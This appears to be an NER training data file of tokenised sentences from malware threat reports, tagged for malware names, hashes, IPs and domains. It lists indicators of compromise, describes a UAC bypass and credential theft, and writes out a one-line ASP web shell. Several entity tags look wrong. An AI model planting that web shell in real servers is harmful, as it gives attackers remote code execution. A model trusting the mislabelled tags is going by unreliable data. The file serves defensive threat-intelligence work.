Ethiopian	O
version	O
of	O
FinSpy	B-malware.backdoor
uses	O
images	O
of	O
opposition	O
members	O
as	O
bait	O
suggests	O
it	O
may	O
be	O
used	O
for	O
politically	O
influenced	O
surveillance	O
activities	O
,	O
rather	O
than	O
strictly	O
law	O
enforcement	O
purposes	O
.	O

To	O
be	O
continued	O
...	O
Meow	O
.	O

Once	O
the	O
data	O
is	O
decrypted	O
with	O
two	O
RC4	O
rounds	O
,	O
the	O
dropper	O
checks	O
the	O
decrypted	O
data	O
contains	O
a	O
valid	O
4-byte	O
signature	O
:	O
0xBC0F1DAD	O
.	O

(	O
and	O
publicly	O
available	O
RATs	B-malware.backdoor
such	O
as	O
PoisonIvy	O
)	O
to	O
maintain	O
access	O
to	O
victim	O
networks	O
.	O

The	O
company	O
's	O
registered	O
IP	O
ranges	O
sit	O
under	O
AS12212	O
with	O
the	O
following	O
prefixes	O
ranged	O
198.55.48.0	B-ip.unknown
–	O
198.55.61.255	B-ip.unknown
,	O
198.55.63.0	B-ip.unknown
–	O
198.55.63.255	B-ip.unknown
and	O
207.176.216.0	B-ip.unknown
–	O
207.176.219.255	B-ip.unknown
.	O

We	O
'll	O
then	O
start	O
poking	O
around	O
looking	O
for	O
routines	O
that	O
might	O
implement	O
the	O
phone	O
home	O
protocol	O
.	O

CrowdStrike	O
identified	O
this	O
X-Agent	B-malware.infosteal
variant	O
within	O
a	O
legitimate	O
Android	O
application	O
named	O
30.apk	B-malware.backdoor
.	O

Wed	O
Jun	O
13	O
07:31:32	O
2007	O
UTC	O
Ch	O
1.0	O
Wed	O
Jun	O
13	O
07:31:32	O
2007	O
UTC	O
Ch	O
1.0	O
Wed	O
Jun	O
13	O
07:31:32	O
2007	O
UTC	O
Ch	O
1.0	O
Tue	O
Jun	O
19	O
12:41:21	O
2007	O
UTC	O
Ch	O
1.0	O
Tue	O
Jun	O
26	O
08:46:11	O
2007	O
UTC	O
Ch	O
1.1	O
Ch	O
1.1	O
Tue	O
Jun	O
26	O
08:46:11	O
2007	O
UTC	O
Ch	O
1.2wcc	O
Tue	O
Jul	O
24	O
12:57:37	O
2007	O
UTC	O
Ch	O
1.2wcc	O
Tue	O
Jul	O
24	O
12:57:37	O
2007	O
UTC	O
Ch	O
1.2wcc	O
Tue	O
Jul	O
24	O
12:57:37	O
2007	O
UTC	O
Thu	O
Jul	O
26	O
07:20:17	O
2007	O
UTC	O
Ch	O
1.2	O
Mon	O
Dec	O
3	O
14:15:58	O
2007	O
UTC	O
Ch	O
1.3	O
Ch	O
1.4	O
Tue	O
Dec	O
11	O
17:36:03	O
2007	O
UTC	O
Tue	O
Dec	O
11	O
17:36:03	O
2007	O
UTC	O
Ch	O
1.4	O
Tue	O
Dec	O
11	O
17:36:03	O
2007	O
UTC	O
Ch	O
1.4	O
Ch	O
1.5	O
Thu	O
Mar	O
27	O
14:58:15	O
2008	O
UTC	O
Thu	O
Mar	O
27	O
14:58:15	O
2008	O
UTC	O
Ch	O
1.5	O
Thu	O
Mar	O
27	O
14:58:15	O
2008	O
UTC	O
Ch	O
1.5	O
Ch	O
1.5	O
Thu	O
Mar	O
27	O
14:58:15	O
2008	O
UTC	O
Mon	O
May	O
5	O
11:27:48	O
2008	O
UTC	O
Mon	O
May	O
12	O
11:52:31	O
2008	O
UTC	O
Thu	O
May	O
22	O
10:24:55	O
2008	O
UTC	O
5ef72904221aa4090a262a24714054f0	B-hash
Thu	O
Nov	O
6	O
13:21:45	O
2008	O
UTC	O
Ch	O
2.05	O
331eca9c7d9fd9cbe7cd192af09880a3	B-hash
Thu	O
Nov	O
6	O
13:21:45	O
2008	O
UTC	O
Ch	O
2.05	O
db1156b072d58acdac1aeab9af2160a2	B-hash
Mon	O
Dec	O
29	O
11:37:17	O
2008	O
UTC	O
Ch	O
2.07	O
74dbea70bfb15db31bb9f757ed4bb1a0	B-hash
Mon	O
Dec	O
29	O
11:37:17	O
2008	O
UTC	O
Ch	O
2.07	O
eb928bca5675722c7e9e2b09eec1158a	B-hash
Mon	O
Sep	O
14	O
13:22:57	O
2009	O
UTC	O
Ch	O
2.11	O
162f415abad9708aa61db8e03bcf2f3c	B-hash
Mon	O
Sep	O
14	O
15:28:07	O
2009	O
UTC	O
Ch	O
2.11	O
448524fd62dec1151c75b55b86587784	B-hash
Tue	O
Sep	O
29	O
10:28:40	O
2009	O
UTC	O
Ch	O
2.12	O
29bb70a40689e9e665d15716519bacfd	B-hash
Mon	O
Dec	O
7	O
14:25:12	O
2009	O
UTC	O
Ch	O
2.13	O
38d6719d6a266c6cefb8626c57378927	B-hash
Ch	O
2.13	O
Mon	O
Dec	O
7	O
14:27:53	O
2009	O
UTC	O
02eda1effde92bdf8462abcf40c4f776	B-hash
Ch	O
2.14.1	O
Wed	O
Feb	O
17	O
15:14:20	O
2010	O
UTC	O
5121ce1f96d74076df1c39748e019f42	B-hash
Ch	O
3.00	O
Tue	O
Jan	O
31	O
16:12:25	O
2012	O
UTC	O
28dc1ca683d6a14d0d1794a68c477604	B-hash
Tue	O
Feb	O
14	O
10:28:06	O
2012	O
UTC	O
40bd7846553550f38e458b8493824cb4	B-hash
Ch	O
3.00	O
Wed	O
Apr	O
4	O
16:23:44	O
2012	O
UTC	O
Ch	O
3.02	O
ba0c777317461ed57a85ffae277044dc	B-hash
b86137fa5a232c614ec5405be4d13b37	B-hash
Ch	O
3.10	O
Tue	O
Dec	O
18	O
08:22:43	O
2012	O
UTC	O
Fri	O
Jun	O
28	O
12:16:40	O
2013	O
UTC	O
7872c1d88fe21d8a85f160a6666c76e8	B-hash
Ch	O
3.20	O
83a48760e92bf30961b4a943d3095b0a	B-hash
Ch	O
3.20	O
Fri	O
Jun	O
28	O
12:16:58	O
2013	O
UTC	O
Mon	O
Jun	O
24	O
10:51:01	O
2013	O
UTC	O
Ch	O
3.20	O
3d65c18d09f47547f85c631ebeeda482	B-hash
Thu	O
Feb	O
6	O
12:37:44	O
2014	O
UTC	O
Ch	O
3.25	O
ec7e3cfaeaac0401316d66e964be684e	B-hash
b407b6e5b4046da226d6e189a67f62ca	B-hash
Ch	O
3.26	O
Thu	O
Jan	O
3	O
18:03:46	O
2013	O
UTC	O

The	O
dropper	O
iterates	O
through	O
each	O
entry	O
in	O
scxrt2.ini	O
,	O
looking	O
for	O
paths	O
named	O
move-to-operational	O
or	O
move-to-operational.lnk	O
.	O

A	O
200.63.46.23	B-ip.unknown
18	O
weddingdressestoday.com	B-url.unknown
.	O

<	O
%	O
execute	O
request	O
(	O
chr	O
(	O
42	O
)	O
)	O
%	O
>	O

61075faba222f97d3367866793f0907b	B-hash
N/A	O
First	O
Seen	O
10-12	O
02:50:16	O
10-03	O
01:01:31	O
10-03	O
01:01:37	O
10-07	O
08:58:00	O
10-12	O
02:50:15	O
10-12	O
02:50:15	O
10-08	O
03:32:47	O
03-14	O
02:13:01	O
02-16	O
03:25:00	O
Compile	O
Time	O
10-01	O
15:37:31	O
10-01	O
11:34:07	O
02-20	O
11:09:30	O
01-05	O
01:11:33	O
02-20	O
11:09:30	O
09-21	O
09:27:43	O
03-06	O
17:32:58	O
02-10	O
15:03:30	O
File	O
#	O
1	O
is	O
the	O
ZIP	O
file	O
containing	O
samples	O
#	O
2-6	O
inside	O
.	O

Both	O
of	O
the	O
above	O
open	O
a	O
document	O
as	O
well	O
as	O
another	O
executable	O
(	O
written	O
in	O
C++	O
)	O
when	O
they	O
are	O
double	O
clicked	O
.	O

Additional	O
reporting	O
on	O
this	O
activity	O
and	O
another	O
going	O
back	O
to	O
August	O
2014	O
was	O
also	O
recently	O
shared	O
on	O
ThreatConnect	O
.	O

We	O
would	O
like	O
to	O
thank	O
the	O
security	O
researchers	O
and	O
organizations	O
who	O
shared	O
information	O
and	O
provided	O
feedback	O
,	O
which	O
have	O
been	O
crucial	O
for	O
this	O
research	O
.	O

It	O
is	O
interesting	O
that	O
this	O
particular	O
group	O
has	O
for	O
years	O
now	O
deployed	O
backdoor	O
and	O
downloader	O
code	O
in	O
the	O
form	O
of	O
.hta	O
files	O
.	O

All	O
rights	O
reserved	O
.	O

Download	O
page	O
,	O
winrar[.]it	B-url.normal

The	O
computing	O
infrastructure	O
in	O
a	O
typical	O
Enterprise	O
is	O
more	O
vulnerable	O
to	O
attack	O
than	O
ever	O
before	O
.	O

SHA-1	O
SHA-256	O
File	O
Size	O
Icon	O
687464d6c668b59f85b0e02012945fe5	B-hash
b3086b4d99288d50585d4c07a3fdd0970a9843fc	B-hash
e7dd9678b0a1c4881e80230ac716b21a41757648d71c538417755521438576f6	B-hash
1233	O
KB	O

'	O
La	O
Russie	O
soupçonnée	O
d'être	O
responsable	O
d'un	O
piratage	O
informatique	O
contre	O
l'OSCE	O
.	O
'	O

This	O
is	O
an	O
example	O
of	O
'	O
not	O
knowing	O
what	O
they	O
are	O
looking	O
for	O
until	O
they	O
fi	O
nd	O
it	O
'	O
.	O

The	O
Dropbox	O
user	O
that	O
registered	O
the	O
account	O
has	O
the	O
following	O
details	O
:	O
Name	O
:	O
P*****	O
Email	O
:	O
P********@mail.ru	O
The	O
data-stealing	O
plugins	O
store	O
all	O
their	O
output	O
in	O
:	O
%	O
USERPROFILE	O
%	O
\AppData\Roaming\Media	O
Before	O
being	O
sent	O
to	O
Dropbox	O
by	O
the	O
main	O
module	O
,	O
the	O
files	O
are	O
encrypted	O
with	O
Blowfish	O
.	O

The	O
links	O
between	O
the	O
forums	O
and	O
contractors	O
may	O
illustrate	O
that	O
the	O
trust	O
communities	O
begin	O
with	O
the	O
Iranian	O
security	O
forums	O
.	O

Two	O
samples	O
of	O
the	O
malware	O
payload	O
were	O
uploaded	O
by	O
different	O
sources	O
in	O
2014	O
,	O
but	O
none	O
of	O
the	O
antivirus	O
vendors	O
featured	O
on	O
VirusTotal	O
flagged	O
them	O
as	O
malicious	O
.	O

Depending	O
on	O
its	O
privileges	O
,	O
the	O
malware	O
drops	O
the	O
files	O
in	O
%	O
ProgramFiles	O
%	O
or	O
%	O
appdata	O
%	O
.	O

This	O
time	O
the	O
attacker	O
again	O
used	O
a	O
financially-themed	O
domain	O
name	O
:	O
On	O
the	O
day	O
of	O
the	O
Diskcoder.C	O
outbreak	O
,	O
the	O
A-record	O
of	O
this	O
domain	O
was	O
changed	O
to	O
10.0.0.1	O
The	O
TeleBots	O
group	O
continues	O
to	O
evolve	O
in	O
order	O
to	O
conduct	O
disruptive	O
attacks	O
against	O
Ukraine	O
.	O

Once	O
the	O
sector	O
of	O
the	O
backup	O
VBR	O
is	O
known	O
,	O
EnCase	O
was	O
started	O
and	O
the	O
image	O
of	O
the	O
infected	O
system	O
was	O
loaded	O
.	O

In	O
spite	O
of	O
these	O
investments	O
,	O
however	O
,	O
the	O
Philippines	O
is	O
still	O
among	O
the	O
most	O
prone	O
countries	O
to	O
be	O
targeted	O
by	O
these	O
sorts	O
of	O
APT	O
attacks	O
.	O

Figure	O
8	O
–	O
Fake	O
CHKDSK	O
message	O
displayed	O
by	O
Diskcoder.C	O
.	O

Once	O
unpacked	O
it	O
,	O
we	O
have	O
discovered	O
the	O
same	O
payload	O
with	O
also	O
the	O
same	O
hash	O
of	O
the	O
first	O
sample	O
The	O
third	O
and	O
the	O
fourth	O
ones	O
are	O
the	O
identical	O
too	O
,	O
also	O
in	O
this	O
the	O
difference	O
is	O
that	O
the	O
fourth	O
one	O
is	O
packed	O
using	O
the	O
UPX	O
tool	O
.	O

Crimea	O
lacks	O
electricity	O
after	O
physical	O
attack	O
News	O
story	O
associating	O
ArtOS	O
project	O
,	O
a	O
joint	O
endeavor	O
with	O
the	O
Noosphere	O
Engineering	O
School	O
Forums	O
discussing	O
the	O
app	O
and	O
claiming	O
to	O
be	O
associated	O
with	O
the	O
developers	O
users	O
are	O
called	O
out	O
as	O
fraudulent	O
some	O
users	O
claim	O
copy	O
apps	O
are	O
distributing	O
malware	O

The	O
area	O
that	O
will	O
contain	O
the	O
critical	O
information	O
is	O
known	O
as	O
the	O
Bios	O
Parameter	O
Block	O
(	O
BPB	O
)	O
.	O

Password	O
is	O
roscomnadzor	O
'	O

Outlook	O
This	O
late	O
2017	O
campaign	O
is	O
a	O
continuation	O
of	O
North	O
Korea	O
's	O
interest	O
in	O
cryptocurrency	O
,	O
which	O
we	O
now	O
know	O
encompasses	O
a	O
broad	O
range	O
of	O
activities	O
including	O
mining	O
,	O
ransomware	O
,	O
and	O
outright	O
theft	O
.	O

Recent	O
activity	O
of	O
the	O
group	O
against	O
US	O
organizations	O
was	O
discussed	O
in	O
a	O
US-CERT	O
advisory	O
,	O
which	O
linked	O
the	O
actor	O
to	O
the	O
Russian	O
government	O
,	O
as	O
well	O
as	O
an	O
advisory	O
by	O
the	O
UK	O
National	O
Cyber	O
Security	O
Centre	O
.	O

We	O
first	O
identified	O
IRONGATE	B-malware.backdoor
when	O
investigating	O
droppers	O
compiled	O
with	O
PyInstaller	O
—	O
an	O
approach	O
used	O
by	O
numerous	O
malicious	O
actors	O
.	O

It	O
also	O
checks	O
if	O
certain	O
processes	O
related	O
to	O
certain	O
security	O
products	O
are	O
running	O
on	O
the	O
affected	O
system	O
.	O

This	O
is	O
shown	O
in	O
the	O
figure	O
below	O
.	O

File	O
MD5	O
hashes	O
:	O

Telltale	O
signs	O
of	O
social	O
engineering	O
include	O
'	O
too-good-to-be-true	O
'	O
offers	O
and	O
messages	O
that	O
lack	O
context	O
.	O

How	O
did	O
you	O
become	O
aware	O
of	O
this	O
threat	O
?	O

Add	O
task	O
Delete	O
task	O
Stop	O
task	O
Modify	O
task	O
or	O
configuration	O
Upload	O
data	O
Download	O
data	O
The	O
following	O
chapter	O
,	O
CozyDuke	B-malware.drop
Tasks	O
,	O
provides	O
further	O
information	O
on	O
the	O
tasks	O
CozyDuke	B-malware.drop
has	O
been	O
observed	O
executing	O
.	O

Upon	O
successful	O
exploitation	O
,	O
the	O
malicious	O
document	O
file	O
drops	O
two	O
files	O
in	O
the	O
%	O
Temp	O
%	O
directory	O
.	O

발견	O
시기	O
공격	O
대상	O
공격	O
방식	O
악성	O
행위	O
2015년	O
7월	O
자산관리	O
솔루션	O
해당	O
업체의	O
디지털	O
인증서	O
유출해	O
서명을	O
악성코드	O
악용	O
2015년	O
11월	O
ADEX	O
참가	O
업체	O
매크로	O
이용한	O
스피어피싱	O
보안	O
업체의	O
디지털	O
인증서	O
유출해	O
2016년	O
2월	O
보안	O
업체	O
보안	O
프로그램	O
취약점	O
악성코드에	O
서명	O
악용	O
2015년	O
11월부터	O
공격	O
시도	O
추정	O
2016년	O
2월	O
DRM	O
제품	O
가장	O
방위산업체	O
,	O
해양	O
,	O
2016년	O
4월	O
ICT	O
서비스	O
제공	O
중앙관리	O
솔루션	O
B	O
취약점	O
2016년	O
6월	O
방위산업	O
관련	O
대기업	O
2016년	O
8월	O
군사	O
관련	O
기관	O
중앙관리	O
시스템	O
A	O
취약점	O
항공기	O
설계도	O
등	O
기밀	O
자료	O
유출	O
백신	O
프로그램	O
관리	O
시스템	O
취약점	O
군사	O
정보	O
유출	O
2016년	O
10월	O
도박	O
게임	O
사용자	O
각종	O
유틸리티	O
설치	O
파일	O
도박성	O
게임	O
패	O
훔쳐보기	O
2017년	O
1월	O
도박	O
게임	O
사용자	O
PC방	O
관리	O
시스템	O
취약점	O
도박성	O
게임	O
패	O
훔쳐보기	O
2017년	O
3월	O
ATM	O
제조	O
업체	O
및	O
백신	O
프로그램	O
관리	O
ATM	O
기기	O
시스템	O
취약점	O
신용카드	O
정보	O
유출	O
후	O
해외에서	O
카드	O
복제	O
(	O
복제카드	O
사용자	O
검거	O
)	O
2016년	O
11월부터	O
공격	O
전개	O
추정	O
2017년	O
3월	O
지급	O
결제	O
대행	O
소프트웨어	O
위장	O
(	O
혹은	O
변조	O
)	O
악성코드	O
추가	O
다운로드	O
2017년	O
4월	O
에너지	O
연구소	O
최소	O
2차례	O
공격	O
시도	O
2017년	O
5월	O
리포트	O
A	O
액티브	O
X	O
취약점	O
금융	O
노조	O
홈페이지	O
통해	O
악성코드	O
감염	O
2017년	O
6월	O
2017년	O
10월	O
여행사	O
A	O
중앙관리	O
솔루션	O
B	O
취약점	O
,	O
스피어피싱	O
(	O
매크로	O
)	O
리포트	O
A	O
취약점	O
,	O
개인	O
정보	O
유출	O
중앙관리	O
솔루션	O
B	O
취약점	O
2017년	O
9월부터	O
공격	O
시작	O
추정	O
2017년	O
12월	O
여행사	O
B	O
2017년	O
12월	O
ERP	O
제품	O
A	O
업데이트	O
여행사	O
A	O
공격에	O
사용된	O
악성코드와	O
유사	O
업데이트	O
관련	O
파일	O
변조해	O
악성코드	O
추가	O
다운로드	O
특정	O
가상화폐	O
거래소를	O
통해	O
다운	O
2017년	O
12월	O
가상화폐	O
사용자	O
원격지원	O
A	O
설치	O
파일	O
로드	O
시	O
악성코드	O
포함된	O
파일	O
다	O
2018년	O
2월	O
가상화폐	O
사용자	O
매크로	O
이용한	O
메일	O
국회	O
의원실	O
사칭	O
2018년	O
4월	O
ERP	O
제품	O
B	O
액티브X	O
취약점	O
[	O
표	O
1	O
]	O
안다리엘	O
그룹	O
주요	O
공격	O
사례	O

Below	O
screen	O
shot	O
shows	O
a	O
network	O
communication	O
pattern	O
indicating	O
a	O
document	O
named	O
'	O
secret.docx	O
'	O
was	O
opened	O
with	O
Microsoft	O
Word	O
.	O

Then	O
it	O
goes	O
on	O
to	O
load	O
the	O
DLL	O
using	O
Windows	O
regsvr32.exe	O
.	O

The	O
failure	O
occurred	O
during	O
the	O
time	O
period	O
when	O
TRITON	O
was	O
used	O
.	O

Their	O
evolving	O
and	O
modified	O
SPLM/CHOPSTICK/XAgent	B-malware.backdoor
code	O
is	O
a	O
longstanding	O
part	O
of	O
Sofacy	O
activity	O
,	O
however	O
much	O
of	O
it	O
is	O
changing	O
.	O

Although	O
the	O
MenuPass	O
Group	O
used	O
mostly	O
publicly	O
available	O
RATs	O
,	O
they	O
were	O
successful	O
in	O
penetrating	O
a	O
number	O
of	O
high	O
value	O
targets	O
,	O
so	O
it	O
is	O
entirely	O
possible	O
this	O
is	O
indeed	O
a	O
continuation	O
of	O
past	O
activity	O
.	O

Infection	O
Chain	O
for	O
the	O
current	O
ChessMaster	O
campaign	O

An	O
individual	O
at	O
the	O
prime	O
minister	O
's	O
office	O
at	O
the	O
Palestinian	O
Authority	O
(	O
both	O
his	O
Gmail	O
account	O
and	O
an	O
account	O
under	O
pmo.pna.ps	O
)	O
.	O

which	O
has	O
resolved	O
to	O
69.80.107.129	B-ip.unknown
since	O
we	O
started	O
examining	O
the	O
case	O
.	O

NBTScan	O
:	O
A	O
free	O
tool	O
for	O
scanning	O
IP	O
networks	O
for	O
NetBIOS	O
name	O
information	O
.	O

DroidJack	B-malware.backdoor
malware	O
.	O

Figure	O
10	O
shows	O
the	O
date	O
of	O
the	O
file	O
after	O
the	O
Web	B-malware.ransom
shell	O
modifies	O
the	O
time	O
stamp	O
.	O

This	O
technique	O
of	O
UAC	O
bypass	O
is	O
mentioned	O
in	O
the	O
blog	O
'	O
Fileless	B-malware.unknown
'	O
UAC	O
Bypass	O
Using	O
eventvwr.exe	O
and	O
Registry	O
Hijacking	O
Normally	O
when	O
eventvwr.exe	O
process	O
(	O
which	O
is	O
running	O
as	O
high	O
integrity	O
process	O
)	O
is	O
invoked	O
,	O
it	O
starts	O
mmc.exe	O
which	O
opens	O
eventvwr.msc	O
causing	O
the	O
Event	O
Viewer	O
to	O
be	O
displayed	O
.	O

Specifically	O
,	O
the	O
malware	O
had	O
an	O
embedded	O
Mimikatz	O
DLL	O
that	O
it	O
used	O
to	O
extract	O
Windows	O
account	O
credentials	O
from	O
the	O
memory	O
of	O
a	O
compromised	O
PC	O
.	O

clients	O
and	O
their	O
associates	O
,	O
on	O
the	O
same	O
dates	O
.	O

directory	O
and	O
loads	O
it	O
as	O
a	O
service	O
.	O

To	O
date	O
,	O
nobody	O
has	O
been	O
able	O
to	O
find	O
any	O
significant	O
code	O
sharing	O
between	O
ExPetr/Petya	O
and	O
older	O
malware	O
.	O

tor.doc	O
passwords	O
paypal	O
logins	O
.	O

4	O
.	O

internationsplanet[.]com	O
Figure	O
11	O
:	O
Table	O
of	O
atomic	O
indicators	O
Figure	O
12	O
:	O
Timeline	O
of	O
various	O
dates	O
associated	O
with	O
the	O
involved	O
indicators	O
While	O
this	O
attack	O
leveraged	O
a	O
zero-day	O
exploit	O
,	O
individual	O
attacker	O
actions	O
do	O
not	O
happen	O
in	O
isolation	O
.	O

@	O
@	O
00	O
dir	O
5	O
@	O
@	O
d81596a9	O
getres	O

HEX	O
compiler	O
version	O
Decoded	O
compiler	O
version	O
009D766F	B-hash
009B766F	B-hash
00AB766F	B-hash
00010000	B-hash
00937809	B-hash
00AA766F	B-hash
009E766F	B-hash
VC	O
2010	O
(	O
build	O
30319	O
)	O
VC	O
2010	O
(	O
build	O
30319	O
)	O
VC	O
2010	O
(	O
build	O
30319	O
)	O
VC	O
2008	O
(	O
build	O
30729	O
)	O
VC	O
2010	O
(	O
build	O
30319	O
)	O
VC	O
2010	O
(	O
build	O
30319	O
)	O

Hostname	O
Samsung.ddns.me	B-url.unknown
Wininit.myq-see.com	B-url.unknown
Winmeif.myq-see.com	B-url.unknown
Collge.myq-see.com	B-url.unknown
Sara2011.no-ip.biz	B-url.unknown
First	O
Seen	O

The	O
compromised	O
eye-watch[.]in	B-url.unknown
domain	O
has	O
been	O
associated	O
with	O
other	O
malicious	O
activity	O
in	O
recent	O
months	O
.	O

(	O
63	O
)	O
(	O
21	O
)	O
Threat	O
Round	O
Up	O
for	O
April	O
20-27	O
GravityRAT	B-malware.drop
-	O
The	O
Two-Year	O
Evolution	O
Of	O
An	O
APT	O
Targ	O
...	O
Vulnerability	O
Spotlight	O
:	O
Hyland	O
Perceptive	O
Documen	O
...	O
Cryptomining	O
Campaign	O
Returns	O
Coal	O
and	O
Not	O
Diamond	O
...	O
Beers	O
with	O
Talos	O
EP27	O
:	O
Smart	O
Install	O
,	O
Vuln	O
Process	O
...	O
Vulnerability	O
Spotlight	O
:	O
Multiple	O
Issues	O
in	O
Foxit	O
...	O

SHA512	O
6568f1f054c56716506ea2acdfb60919cc55f3da4ef05dee88925b6ccb835ad471e7d0d3e61befca	B-hash
8b7d320c08ee7ba96322c127329c6f94bfb288eeb9c6a0c5	B-hash

A	O
TrendLabs	O
Report	O

jmidebs	O

The	O
exploit	O
for	O
this	O
vulnerability	O
was	O
leaked	O
in	O
a	O
Hacking	O
Team	O
dump	O
.	O

If	O
so	O
,	O
it	O
spawns	O
the	O
service	O
watchdog	O
thread	O
.	O

Customer	O
Stories	O
Blogs	O

We	O
believe	O
the	O
attacks	O
are	O
launched	O
by	O
an	O
APT	O
Group	O
we	O
track	O
under	O
the	O
codename	O
'	O
ScarCruft	B-malware.infosteal
'	O
.	O

We	O
have	O
observed	O
actors	O
amending	O
the	O
ScanBox	B-malware.infosteal
framework	O
to	O
evade	O
existing	O
public	O
signatures	O
,	O
detailed	O
below	O
.	O

Pastebin	O
Account	O
:	O

FireEye	O
is	O
a	O
registered	O
trademark	O
of	O
FireEye	O
,	O
Inc	O
.	O

At	O
this	O
time	O
,	O
we	O
are	O
reaching	O
out	O
to	O
victims	O
of	O
active	O
infections	O
to	O
offer	O
remediation	O
assistance	O
,	O
IOCs	O
,	O
and	O
our	O
full	O
intelligence	O
report	O
to	O
help	O
them	O
counteract	O
this	O
threat	O
.	O

Even	O
with	O
a	O
minimal	O
static	O
footprint	O
,	O
upon	O
document	O
load	O
,	O
the	O
remote	O
Flash	O
object	O
will	O
be	O
retrieved	O
and	O
executed	O
within	O
the	O
context	O
of	O
Microsoft	O
Office	O
.	O

It	O
has	O
almost	O
no	O
code	O
associated	O
with	O
it	O
other	O
than	O
standard	O
iOS	O
app	O
runtime	O
code	O
.	O

JRat	B-malware.backdoor
Controller	O
on	O
Windows	O

But	O
,	O
when	O
the	O
UTF-8	O
based	O
filename	O
is	O
displayed	O
in	O
ANSI	O
,	O
the	O
name	O
is	O
displayed	O
as	O
'	O
gpj.1bajaR.exe	B-malware.infosteal
'	O
.	O

After	O
the	O
encrypted	O
timestamp	O
values	O
,	O
the	O
file	O
contains	O
a	O
number	O
of	O
records	O
encrypted	O
with	O
AES	O
,	O
delimited	O
by	O
EAE9E8FF	O
.	O

We	O
were	O
able	O
to	O
retain	O
a	O
copy	O
of	O
an	O
email	O
used	O
to	O
target	O
an	O
Israeli	O
ambassador	O
in	O
a	O
large	O
eastern	O
European	O
country	O
.	O

<	O
static	O
version	O
string	O
>	O
==	O

OSTMORTEM	O

Most	O
notably	O
,	O
Russian	O
attempts	O
to	O
influence	O
Ukrainian-EU	O
relations	O
resulted	O
in	O
the	O
large-scale	O
,	O
Maidan	O
protest	O
movement	O
,	O
eventually	O
resulting	O
in	O
the	O
ouster	O
of	O
then-president	O
Victor	O
YANUKOVYCH	O
,	O
the	O
invasion	O
and	O
annexation	O
of	O
the	O
Crimean	O
Peninsula	O
by	O
Russia	O
,	O
and	O
the	O
protracted	O
armed	O
conflict	O
in	O
eastern	O
Ukraine	O
.	O

This	O
low	O
confidence	O
but	O
persistent	O
hunch	O
is	O
what	O
motivates	O
us	O
to	O
ask	O
about	O
the	O
origin	O
of	O
ExPetr/Petya	O
.	O

2016	O
5:19	O
AM	O
.	O

File	O
Reputation	O
–	O
Tune	O
Anti-Virus	O
file	O
reputation	O
systems	O
to	O
the	O
most	O
aggressive	O
setting	O
possible	O
;	O
some	O
products	O
can	O
limit	O
execution	O
to	O
only	O
the	O
highest	O
reputation	O
files	O
,	O
stopping	O
a	O
wide	O
range	O
of	O
untrustworthy	O
code	O
from	O
gaining	O
control	O
.	O

In	O
addition	O
,	O
we	O
expose	O
the	O
identity	O
of	O
an	O
individual	O
who	O
is	O
behind	O
the	O
DustySky	B-malware.drop
campaign	O
.	O

In	O
comparison	O
,	O
the	O
Groundbait	O
attackers	O
registered	O
and	O
paid	O
for	O
their	O
own	O
malicious	O
domains	O
and	O
IP	O
addressees	O
.	O

This	O
initial	O
version	O
of	O
ANEL	B-malware.backdoor
had	O
a	O
hardcoded	O
version	O
labeled	O
'	O
5.0.0	O
beta1	O
'	O
that	O
contained	O
incomplete	O
code	O
.	O

OceanLotus	O
Group	O
(	O
which	O
also	O
goes	O
by	O
the	O
names	O
APT-C-00	O
,	O
SeaLotus	O
and	O
APT32	O
)	O
,	O
which	O
was	O
first	O
documented	O
by	O
Qihoo	O
360	O
's	O
SkyEye	O
Labs	O
in	O
2015	O
and	O
further	O
researched	O
by	O
other	O
security	O
companies	O
,	O
including	O
FireEye	O
's	O
report	O
.	O

If	O
the	O
installed	O
product	O
matches	O
a	O
name	O
on	O
the	O
list	O
,	O
the	O
dropper	O
will	O
immediately	O
exit	O
.	O

Mimikatz	B-malware.unknown
–	O
PowerShell	O
and	O
Binary	O
versions	O
,	O
with	O
multiple	O
layers	O
of	O
obfuscation	O
.	O

안다리엘	O
그룹은	O
한국에서	O
많이	O
사용되는	O
중앙관리	O
솔루션을	O
이용한	O
다수의	O
공격을	O
전개한	O
바	O
있다	O
.	O

3/12	O

The	O
server	O
variant	O
appears	O
to	O
have	O
a	O
modular	O
design	O
allowing	O
an	O
attacker	O
to	O
compile	O
only	O
the	O
components	O
that	O
are	O
necessary	O
for	O
any	O
given	O
operation	O
.	O

After	O
gaining	O
access	O
to	O
the	O
server	O
,	O
the	O
attackers	O
installed	O
the	O
tools	O
they	O
needed	O
at	O
different	O
times	O
.	O

However	O
,	O
archived	O
versions	O
of	O
some	O
pages	O
can	O
be	O
found	O
:	O

First	O
Seen	O
:	O

Only	O
one	O
post	O
was	O
published	O
,	O
with	O
text	O
in	O
English	O
and	O
Hebrew	O
.	O

Checks	O
for	O
the	O
presence	O
of	O
security	O
tools	O
(	O
detailed	O
in	O
the	O
Appendix	O
)	O
and	O
if	O
any	O
of	O
these	O
security	O
tools	O
are	O
discovered	O
,	O
then	O
the	O
system	O
will	O
be	O
shut	O
down	O
,	O
as	O
shown	O
in	O
Figure	O
14	O
.	O

Trojan.MSIL.Musik	O

This	O
threat	O
analysis	O
will	O
help	O
to	O
inform	O
organizations	O
and	O
support	O
their	O
decision	O
making	O
on	O
how	O
to	O
better	O
contain	O
or	O
mitigate	O
the	O
threat	O
through	O
monitoring	O
or	O
blocking	O
.	O

Receiving	O
next	O
commands	O
from	O
the	O
C	O
&	O
C	O
The	O
following	O
cmd	O
commands	O
sent	O
from	O
the	O
C	O
&	O
C	O
are	O
then	O
passed	O
to	O
the	O
worker	O
thread	O
and	O
written	O
to	O
cache.txt	O
.	O

In	O
particular	O
,	O
the	O
group	O
redirected	O
visitors	O
from	O
software	O
aggregation	O
and	O
sharing	O
site	O
tamindir[.]com	B-url.unknown
to	O
their	O
attacker-controlled	O
site	O
at	O
true-crypt[.]com	B-url.unknown
.	O

When	O
uncompressed	O
,	O
these	O
archives	O
typically	O
contain	O
the	O
malicious	B-malware.backdoor
payload	O
itself	O
,	O
which	O
the	O
user	O
may	O
then	O
run	O
directly	O
.	O

Executive	O
Perspective	O
Blog	O
Threat	O
Research	O
Blog	O
Products	O
and	O
Services	O
Blog	O

We	O
believe	O
this	O
malicious	O
software	O
has	O
been	O
developed	O
by	O
the	O
Animal	O
Farm	O
espionage	O
group	O
,	O
who	O
also	O
created	O
the	O
infamous	O
Casper	B-malware.unknown
,	O

It	O
then	O
enumerates	O
the	O
library	O
's	O
EAT	O
to	O
find	O
exported	O
function	O
names	O
by	O
checking	O
each	O
function	O
name	O
for	O
the	O
character	O
and	O
the	O
specific	O
offset	O
.	O

Send	O
link	O
mirroring	O
structure	O
of	O
legitimate	O
organization	O
's	O
site	O
that	O
is	O
designed	O
